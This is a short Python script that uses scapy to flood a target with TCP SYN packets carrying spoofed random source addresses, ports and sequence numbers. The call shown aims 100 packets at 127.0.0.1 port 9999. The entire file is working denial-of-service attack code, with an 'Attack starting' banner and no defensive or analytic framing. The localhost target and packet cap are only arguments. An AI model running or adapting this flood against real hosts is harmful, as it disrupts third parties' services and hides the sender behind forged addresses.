from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.volatile import RandShort, RandIP

def test(target, port, max):
    counter = 0
    print("Attack starting...")
    try:
        while counter < max:
            t = IP(src = RandIP(), dst = target)
            s = TCP(sport = RandShort(), dport = port, seq = RandShort(), window = 500, flags="S")
            packet = t / s
            send(packet, verbose=0)
            counter += 1
        print(f"{counter} packets have been sent to {target}:{port}")

    except Exception as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        print("\nAttack stopped")

test("127.0.0.1", 9999, max=100)